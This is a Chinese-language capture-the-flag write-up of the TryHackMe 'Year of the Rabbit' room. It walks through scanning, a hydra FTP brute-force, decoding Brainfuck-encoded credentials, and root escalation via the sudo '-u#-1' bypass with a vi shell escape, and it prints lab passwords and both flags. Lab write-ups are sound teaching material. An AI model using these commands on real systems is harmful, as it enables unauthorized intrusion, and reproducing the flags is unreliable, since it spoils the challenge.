#服务发现
```
──(root💀kali)-[~/tryhackme/yearofrabbit]
└─# nmap -sV -Pn 10.10.17.116           
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 01:45 EDT
Nmap scan report for 10.10.17.116
Host is up (0.35s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```

看到开启了ftp服务，尝试匿名登录，失败



#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100 -u http://10.10.17.116

 _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
(_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-27_01-46-00.log

Target: http://10.10.17.116                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[01:46:00] Starting: 
[01:46:02] 200 -    8KB - /
[01:46:07] 301 -  313B  - /assets  ->  http://10.10.17.116/assets/
[01:52:59] 403 -  277B  - /server-status   
```


在```http://10.10.17.116/assets/style.css```发现一行注释
>Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php

打开```http://10.10.17.116/sup3r_s3cret_fl4g/```页面，会跳转到一个youtube的页面，查看网页源代码提示我们要禁用javascript

禁用浏览器javascript以后页面留下文字和一个和youtube里一样的视频

> Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!

视频是```Rick Astley - Never Gonna Give You Up (Official Music Video)```

文字说线索在视频里

我开始以为是视频里有隐写文件，折腾了一段时间没什么收获，看别人writeup才知道mp4文件里56秒出作者有提示
>“I’ll put you out of your misery **burp** you’re looking in the wrong place”

这个英文不好的话肯定就漏掉这个提示了。。。

首先在burp开启监听，勾选remove all javascript

然后在主页（apache那个页面）访问/sup3r_s3cr3t_fl4g.php

截断发送请求后发送到repeat,此时
request请求如下：
```
GET /sup3r_s3cr3t_fl4g.php HTTP/1.1

Host: 10.10.17.116

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

```

response返回如下：
```
HTTP/1.1 302 Found

Date: Mon, 27 Sep 2021 09:30:08 GMT

Server: Apache/2.4.10 (Debian)

Location: intermediary.php?hidden_directory=/WExYY2Cv-qU

Content-Length: 0

Connection: close

Content-Type: text/html; charset=UTF-8
```

Location这里返回了一个链接```intermediary.php?hidden_directory=/WExYY2Cv-qU```,我们访问这个目录```/WExYY2Cv-qU```


打开目录是一个png文件，直接查看文件源信息，底下有明文提示：
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9

```

ftp服务的用户名是：```ftpuser```,密码是下面期中一个。把密码保存为passwd.txt，爆破ftp
```
┌──(root💀kali)-[~/tryhackme/yearofrabbit]
└─# hydra -l ftpuser -P /root/tryhackme/yearofrabbit/passwd.txt 10.10.17.116 ftp        
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-27 05:45:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.17.116:21/
[21][ftp] host: 10.10.17.116   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-27 05:45:47

```

#登录ftp,把文件下载到本地
```
┌──(root💀kali)-[~/tryhackme/yearofrabbit]
└─# ftp 10.10.17.116
Connected to 10.10.17.116.
220 (vsFTPd 3.0.2)
Name (10.10.17.116:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (3.1567 MB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/yearofrabbit]
└─# ls
 aliIOS  "Eli's_Creds.txt"   Hot_Babe.png   _Hot_Babe.png.extracted   passwd.txt   RickRolled.mp4
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/yearofrabbit]
└─# cat "Eli's_Creds.txt" 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

```

打开是奇怪的符号，放到谷歌里查是一种叫```Brainfuck```的编程语言

放到[这个网站](https://gc.de/gc/brainfuck/),解出来一组账号密码：
```
User: eli
Password: DSpDiM1wAEwid
```

登录ssh以后发现user.txt在另一个用户的目录里,然而当前用户没有权限查看
```
eli@year-of-the-rabbit:/home$ find / -name user.txt
/home/gwendoline/user.txt
eli@year-of-the-rabbit:~$ cat /home/gwendoline/user.txt
cat: /home/gwendoline/user.txt: Permission denied
eli@year-of-the-rabbit:~$ cd ..
eli@year-of-the-rabbit:/home$ ls
eli  gwendoline
eli@year-of-the-rabbit:/home$ ls -alh
total 16K
drwxr-xr-x  4 root       root       4.0K Jan 23  2020 .
drwxr-xr-x 23 root       root       4.0K Jan 23  2020 ..
drwxr-xr-x 16 eli        eli        4.0K Jan 23  2020 eli
drwxr-xr-x  2 gwendoline gwendoline 4.0K Jan 23  2020 gwendoline

```

也就是我们需要横向提权到```gwendoline```用户

#再次登录eli账号的时候收到了这条信息
>1 new message
>Message from Root to Gwendoline:
>"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
>END MESSAGE


#查找s3cr3t相关信息
```
find / -name s3cr3t
/usr/games/s3cr3t
find: `/root': Permission denied
find: `/etc/cups/ssl': Permission denied
find: `/etc/polkit-1/localauthority': Permission denied
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -alh
total 12K
drwxr-xr-x 2 root root 4.0K Jan 23  2020 .
drwxr-xr-x 3 root root 4.0K Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
```

找到gwendoline的密码是：```MniVCQVhQHUNI```

拿到user.txt
```
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ cat /home/gwendoline/user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

查看sudo -l权限
```
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

```

关于```(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt```这条命令，
All表示本账号可以用任何人的身份运行这条命令
!root表示本账号不是root账号

此时如果我们用```sudo -u#-1```即可使用```root```权限运行这条命令，因为-u#-1返回的是一个0值，也就是root的id值

以上参考[这篇文章](https://www.exploit-db.com/exploits/47502)

按照[gtfobins](https://gtfobins.github.io/gtfobins/vi/)里vi提权的方法，
1，我们可以先用vi命令打开这个文件

```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```
2，输入
```
:set shell=/bin/sh
```
3,输入
```
:shell
```

即可提升到root权限

```
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
# 
```